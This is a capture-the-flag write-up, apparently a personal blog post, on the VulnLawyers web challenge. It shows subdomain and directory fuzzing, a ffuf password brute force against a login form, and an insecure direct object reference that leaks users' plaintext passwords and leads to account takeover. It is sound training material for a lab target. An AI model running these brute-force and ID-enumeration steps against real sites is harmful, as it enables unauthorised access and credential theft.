{"pageProps":{"frontmatter":{"autoEqnLabels":false,"autoSectionLabels":false,"ccsDelim":", ","ccsLabelSep":"—","ccsTemplate":"$$i$$$$ccsLabelSep$$$$t$$","chapDelim":".","chapters":false,"chaptersDepth":1,"codeBlockCaptions":true,"cref":false,"crossrefYaml":"pandoc-crossref.yaml","date":"2022-09-14","eqLabels":"arabic","eqnBlockInlineMath":false,"eqnBlockTemplate":"<table>\n<colgroup>\n<col style=\"width: 90%\" />\n<col style=\"width: 10%\" />\n</colgroup>\n<tbody>\n<tr class=\"odd\">\n<td style=\"text-align: center;\"><span\nclass=\"math display\"><em>t</em></span></td>\n<td style=\"text-align: right;\"><span\nclass=\"math display\"><em>i</em></span></td>\n</tr>\n</tbody>\n</table>\n","eqnIndexTemplate":"($$i$$)","eqnInlineTemplate":"$$e$$$$equationNumberTeX$${$$i$$}","eqnPrefix":["eq.","eqns."],"eqnPrefixTemplate":"$$p$$ $$i$$","equationNumberTeX":"\\qquad","figLabels":"arabic","figPrefix":["fig.","figs."],"figPrefixTemplate":"$$p$$ $$i$$","figureTemplate":"$$figureTitle$$ $$i$$$$titleDelim$$ $$t$$","figureTitle":"Figure","lastDelim":", ","linkReferences":false,"listings":false,"listingTemplate":"$$listingTitle$$ $$i$$$$titleDelim$$ $$t$$","listingTitle":"Listing","listItemTitleDelim":".","lofItemTemplate":"$$lofItemTitle$$$$i$$$$listItemTitleDelim$$ $$t$$  \n","lofTitle":"# List of Figures\n","lolItemTemplate":"$$lolItemTitle$$$$i$$$$listItemTitleDelim$$ $$t$$  \n","lolTitle":"# List of Listings\n","lotItemTemplate":"$$lotItemTitle$$$$i$$$$listItemTitleDelim$$ $$t$$  \n","lotTitle":"# List of Tables\n","lstLabels":"arabic","lstPrefix":["lst.","lsts."],"lstPrefixTemplate":"$$p$$ $$i$$","metaDesc":"A writeup for the VulnLawyers challenge from ctfchallenge.com","metaImg":"https://ctfchallenge.com/images/ctflogo-trans.png","metaTitle":"CTF Challenge VulnLawyers Writeup","nameInLink":false,"numberSections":false,"pairDelim":", ","rangeDelim":"-","refDelim":", ","refIndexTemplate":"$$i$$$$suf$$","secHeaderDelim":null,"secHeaderTemplate":"$$i$$$$secHeaderDelim[n]$$$$t$$","secLabels":"arabic","secPrefix":["sec.","secs."],"secPrefixTemplate":"$$p$$ $$i$$","sectionsDepth":0,"subfigGrid":false,"subfigLabels":"alpha a","subfigureChildTemplate":"$$i$$","subfigureRefIndexTemplate":"$$i$$$$suf$$ ($$s$$)","subfigureTemplate":"$$figureTitle$$ $$i$$$$titleDelim$$ $$t$$. $$ccs$$","tableEqns":false,"tableTemplate":"$$tableTitle$$ $$i$$$$titleDelim$$ $$t$$","tableTitle":"Table","tags":["ctf","web","writeup"],"tblLabels":"arabic","tblPrefix":["tbl.","tbls."],"tblPrefixTemplate":"$$p$$ $$i$$","title":"CTF Challenge VulnLawyers Writeup","titleDelim":":"},"content":"\n\\[\\[toc\\]\\]\n\n## A Little Disclaimer\n\nSo you’re looking for answers, are ya? Well, I’ve got them, but for a\nprice… Namely a little bit of your time and attention:\n\n**Please try the challenges yourself before checking the answers.**\n\nCTF’s are notoriously ‘NP’ prone. Once you’ve seen the answer, it’s easy\nto think you could’ve come up with that. There is nothing wrong with\nlooking up answers, but try reflect on why you couldn’t figure it out. I\ntry to explain my thought process as best and brief as possible, but\nfiguring it out yourself is just the best feeling, so please give it\nanother go when you’re reading this! I’ll not include any of the flags\nto avoid people simply copying and pasting them.\n\nAnother note, I create these writeups as if speaking to myself. If my\nmanner of speaking seems a bit odd, you try talking to yourself without\nsounding a little odd.\n\n## Flags\n\n### Data Baby (Enumeration)\n\nThe first flag can be found by performing a standard recon of the\nsubdomains of `vulnlawyers.co.uk`.\n\n    $ dnsrecon -d vulnlawyers.co.uk -D ~/path/to/wordlists/subdomains.txt -t brt\n\n    [*] Using the dictionary file: /home/zohar/Documents/Playground/wordlists/subdomains.txt (provided by user)\n    [*] brt: Performing host and subdomain brute force against vulnlawyers.co.uk...\n    [+]     A data.vulnlawyers.co.uk 68.183.255.206\n    [+]     A www.vulnlawyers.co.uk 68.183.255.206\n    [+] 2 Records Found\n\nDoing a http request with `curl`, or opening the domain in your browser\nreturns some info about the API and the first flag.\n\n    $ curl http://data.vulnlawyers.co.uk -H \"Cookie: <your_ctf_cookie>\"\n\n    {\"name\":\"VulnLawyers Website API\",\"version\":\"2.1.04\",\"flag\":\"[^FLAG^1337-DIY-1337^FLAG^]\"}\n\n### Browsers are Evil (Enumeration)\n\nNow that we know the different domains that are available to us, let’s\ndo some recon on the different files and folders we have access to.\n\n    $ ffuf -w ~/Documents/Playground/wordlists/content.txt -t 1 -p 0.1 -H \"Cookie: ctfchallenge=<your_ctf_cookie>\" -u http://www.vulnlawyers.co.uk/FUZZ\n\n\n            /'___\\  /'___\\           /'___\\       \n           /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n           \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n            \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n             \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n              \\/_/    \\/_/   \\/___/    \\/_/       \n\n    [...]\n    ________________________________________________\n\n    css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 15ms]\n    denied                  [Status: 401, Size: 1020, Words: 178, Lines: 30, Duration: 15ms]\n    images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 15ms]\n    js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 14ms]\n    login                   [Status: 302, Size: 1119, Words: 197, Lines: 31, Duration: 16ms]\n\nSince we are (always) looking to escalate privileges, the `login`\nendpoint looks especially interesting. Entering\n`http://www.vulnlawyers.co.uk/login` in your browser will lead to a page\nthat says **Acess is denied from your IP address**. Shit. But take a\nlook at where we are `http://www.vulnlawyers.co.uk/denied`, we’ve been\nrerouted.\n\nLet’s take a look at what happens with our request in the browser by\nopening the developer tab (often <kbd>F12</kbd>, but if you didn’t know\nthat, you might want to look into some other challenges). Opening the\n‘Network’ tab (on Firefox, might be different on Chrome, Safari, etc.)\nshows that we got a `302` code from the `/login` endpoint. This code\nspecifically tells a *browser* to reroute to a URL given by the\n`Location` header [^1].\n\nBrowsers can do weird stuff, so let’s try to ask `curl` what’s up.\n\n    $ curl www.vulnlawyers.co.uk/login -H \"Cookie: ctfchallenge=<your_ctf_cookie>\"\n\n    [...]\n      <div class=\"alert alert-info\">\n          <p>Access to this portal can now be found here <a href=/lawyers-only\">/lawyers-only</a></p>\n          <p>[^FLAG^TRY_ME_B*TCH^FLAG^]</p>\n      </div>\n    [...]\n\nWell, would you look at that, a flag and a hidden endpoint :eyes:!\nChristmas came early this year.\n\nOpening the URL `http://www.vulnlawyers.co.uk/lawyers-only` will bring\nus to a login screen. Now we can start gaining some unrequisited\nprivileges.\n\n### Pipelining (Enumeration)\n\nThe current goal is to log in, but we lack any user data. Thinking back,\nthe `data.vulnlawyers.co.uk` probably contains some of that precious\nuser data. Actually, we have yet to enumerate files and folders. Not you\ntho, no, while we were trying to figure out how to access the login\npage, you have of course started `ffuf`’ing (that’s not a word, but it\nshould be) the domain. If you haven’t, keep in mind that reconnaissance\ncan sometimes take a long time. Minimize waiting and keep that noggin of\nyours churning.\n\n    $ ffuf -w ~/Documents/Playground/wordlists/content.txt -t 1 -p 0.1 -H \"Cookie: ctfchallenge=<your_ctf_cookie>\" -u http://data.vulnlawyers.co.uk/FUZZ\n\n\n            /'___\\  /'___\\           /'___\\       \n           /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n           \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n            \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n             \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n              \\/_/    \\/_/   \\/___/    \\/_/       \n\n    [...]\n    ________________________________________________\n    users                   [Status: 200, Size: 406, Words: 6, Lines: 1, Duration: 21ms]\n\n’Lo and behold, an endpoint called `/users`. Let’s employ `curl` and see\nwhat it holds.\n\n    curl data.vulnlawyers.co.uk/users -H \"Cooki e: ctfchallenge=<your_ctf_cookie>\"\n    {\n      \"users\": [\n        {\n          \"name\": \"Yusef Mcclain\",\n          \"email\": \"yusef.mcclain@vulnlawyers.co.uk\"\n        },\n        {\n          \"name\": \"Shayne Cairns\",\n          \"email\": \"shayne.cairns@vulnlawyers.co.uk\"\n        },\n        {\n          \"name\": \"Eisa Evans\",\n          \"email\": \"eisa.evans@vulnlawyers.co.uk\"\n        },\n        {\n          \"name\": \"Jaskaran Lowe\",\n          \"email\": \"jaskaran.lowe@vulnlawyers.co.uk\"\n        },\n        {\n          \"name\": \"Marsha Blankenship\",\n          \"email\": \"marsha.blankenship@vulnlawyers.co.uk\"\n        }\n      ],\n      \"flag\": \"[^FLAG^https://media.giphy.com/media/26gs6vEzlpaxuYgso/giphy.gif^FLAG^]\"\n    }\n\nAnd that’s our third flag. Onto exploitation!\n\n### Higher and Higher (Exploitation)\n\nWith a bit of luck, the attorneys are not technically inclined and use\nsimple passwords. After a bit of trail-and-error, we stumble upon\nJaskaran Lowe.\n\n    ffuf -w ~/Documents/Playground/wordlists/passwords.txt -t 1 -p 0.1 -H \"Cookie: ctfchallenge=<your_ctf_cookie>\" -u http://www.vulnlawyers.co.uk/lawyers-only-login -H \"Content-Type: applicati\n    on/x-www-form-urlencoded\" -d 'email=jaskaran.lowe@vulnlawyers.co.uk&password=FUZZ' -fr \"Invalid\"\n\n\n            /'___\\  /'___\\           /'___\\       \n           /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n           \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n            \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n             \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n              \\/_/    \\/_/   \\/___/    \\/_/       \n\n    [...]\n    ________________________________________________\n\n    summer                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 17ms]\n\nLogging in using browser gives us some info regarding a case, but more\nimportantly, the next flag!\n\n### Some More Digging (Exploitation)\n\nWe got a whole new section of the site to explore! Now, it might be\nworth doing some more fuzzing on the path since we’ve actually been\nredirected to `.../lawyers-only-login` from `.../lawyers-only`, and\nopening the **Profile tab** shows the path `.../lawyers-only-profile`.\nThus, we run `ffuf [...] http://www.vulnlawyers.co.uk/lawyers-only-FUZZ`\nwhile further exploring the new domain. Spoiler alert: no interesting\nresults, but good habit nonetheless.\n\nLooking at the **Portal** page shows a list of current cases. There is a\nsingle case which is managed by *Shayne Cairns*, who is also the only\none who can perform actions on it. New goal: gain access to their\naccount. Opening the source code of the shows nothing interesting.\n\nTaking a closer look at the **Profile** page shows us a place where we\ncan update our user data! Immediate thought: could we somehow use this\nto update another user’s profile info? Let’s take a look at the request\npayload using the **Network** tab in the dev tools.\n\n    name=Jaskaran+Lowe&email=jaskaran.lowe%40vulnlawyers.co.uk\n\nHmm, doesn’t seem like it. This leads to finding more info in the\nrequest, like a new cookie called `token`. Makes sense, these requests\nhave to be authenticated, we should include this in any requests we do\nvia the terminal. Otherwise, nothing seems unusual.\n\nPerhaps we can find something interesting in the source code. Let’s use\n`curl` to retrieve the data.\n\n    $ curl curl http://www.vulnlawyers.co.uk/lawyers-only-profile -H \"Cookie: ctfchallenge=<your_ctf_cookie>; token=<your_lawyer_cookie>\"\n\n    <script>\n        $.getJSON('/lawyers-only-profile-details/4',function(resp){\n            $('input[name=\"email\"]').val( resp.email );\n            $('input[name=\"name\"]').val( resp.name );\n        });\n    </script>\n\nOh would you look at that :sunglasses:! That’s how our info was already\nfilled in! For some reason they use some other source than the\n`data.vulnlawyers.co.uk/users` endpoint which we’ve seen before. Maybe\nthis contains different information.\n\n    $ curl http://www.vulnlawyers.co.uk/lawyers-only-profile-details/4 -H \"Cookie: ctfchallenge=<your_ctf_cookie>; token=<your_lawyer_cookie>\"\n\n    {\n      \"id\": 4,\n      \"name\": \"Jaskaran Lowe\",\n      \"email\": \"jaskaran.lowe@vulnlawyers.co.uk\",\n      \"password\": \"summer\"\n    }\n\nOh yes. Plain old passwords. Of course, they should have used the\n`data.vulnlawyers.co.uk/users` API endpoint to retrieve that data. Let’s\naccess *Shayne Cairns* profile details with the user `id` which we can\nfind at `data.vulnlawyers.co.uk/users`. Small note: that id was\nzero-indexed (Jaskaran’s `id` here is `4` while it was `3` before), this\none isn’t. Compensating for that gives the following request.\n\n    $ curl http://www.vulnlawyers.co.uk/lawyers-only-profile-details/2 -H \"Cookie: ctfchallenge=<your_ctf_cookie>; token=<your_lawyer_cookie>\"\n\n    {\n      \"id\": 2,\n      \"name\": \"Shayne Cairns\",\n      \"email\": \"shayne.cairns@vulnlawyers.co.uk\",\n      \"password\": \"w&#2a1^3p\",\n      \"flag\": \"[^FLAG^NA_AH^FLAG^]\"\n    }\n\nFlag number five!\n\n### Finishing Up (Exploitation)\n\nThis leaves us to the last flag. We now use the found credentials to log\nin as Shayne Cairns, delete the case, and find the last flag :trophy:.\n\n[^1]: [302\n    Found](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/302)\n"},"__N_SSG":true}